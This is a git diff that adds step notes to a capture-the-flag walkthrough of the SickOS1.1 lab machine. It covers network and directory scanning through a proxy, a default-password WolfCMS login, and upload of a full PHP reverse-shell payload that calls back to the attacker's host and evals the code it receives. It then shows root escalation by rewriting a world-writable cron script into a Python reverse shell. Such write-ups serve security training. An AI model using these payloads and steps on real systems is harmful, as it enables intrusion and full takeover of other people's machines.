@@ -2,6 +2,7 @@
 
 ## 1. Emmu
 
+Netscan
 ```
 nmap -sn 192.168.174.0/24
 Starting Nmap 7.01 ( https://nmap.org ) at 2016-01-04 15:59 CET
@@ -10,6 +11,7 @@ Nmap scan report for 192.168.174.133
 Host is up (0.00013s latency).
 ```
 
+Portscan Vic
 ```
 nmap -sS -A -PN -p- -T5 192.168.174.133
 
@@ -43,6 +45,8 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 93.39 seconds
 ```
 
+
+No HTTP open, but we can use the proxy
 ```
 curl -v 192.168.174.133 --proxy 192.168.174.133:3128
 * Rebuilt URL to: 192.168.174.133/
@@ -73,7 +77,10 @@ curl -v 192.168.174.133 --proxy 192.168.174.133:3128
 BLEHHH!!!
 </h1>
 ```
+nothing here :(
 
+
+Dir-Scan
 ```
 dirb http://192.168.174.133 /usr/share/wordlists/dirb/big.txt -p 192.168.174.133:3128
 
@@ -101,6 +108,7 @@ GENERATED WORDS: 20458
                                                                                                                                                                                                             
 ```
 
+Check robots.txt
 ```
 curl -v 192.168.174.133/robots.txt --proxy 192.168.174.133:3128
 
@@ -110,6 +118,8 @@ Dissalow: /wolfcms
 -----------------
 ```
 
+
+Some searching about wolfcms -> admin-Login (tried some common combinations)
 ```
 http://192.168.174.133/wolfcms/?/admin/login
 admin:admin
@@ -119,11 +129,10 @@ Files -> Upload (msfvenom-php-shell)
 ```php
 <?php error_reporting(0); $ip = '192.168.174.132'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } elseif (($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } elseif (($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } else { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; eval($b); die();
 ```
-http://192.168.174.133/wolfcms/?/admin/plugin/file_manager/view/connect.php
+Uploaded file -> http://192.168.174.133/wolfcms/?/admin/plugin/file_manager/view/connect.php
 
 
-
-
+Start a Msf-Listener
 ```
 msf > use exploit/multi/handler 
 msf exploit(handler) > set payload php/meterpreter/reverse_tcp
@@ -142,16 +151,16 @@ Server username: www-data (33)
 ```
 
 
-
+some research on host
 ```
 cat /etc/cron.d/automate
 * * * * * root /usr/bin/python /var/www/connect.py
-
 
 ls -lah /var/www/connect.py
 -rwxrwxrwx  1 root     root       77 Jan  5 15:26 connect.py
 ```
 
+edit cronjob with python reverse-shell
 ```
 meterpreter > edit connect.py
 
@@ -168,6 +177,7 @@ p=subprocess.call(["/bin/sh","-i"])
 ```
 
 
+open reverse-listener and wait for cronjob
 ```
 root@kali:~/Desktop# nc -lvp 9999
 listening on [any] 9999 ...
@@ -197,3 +207,6 @@ ROOT!
 You have Succesfully completed SickOS1.1.
 Thanks for Trying
 ```
+
+
+got it :)
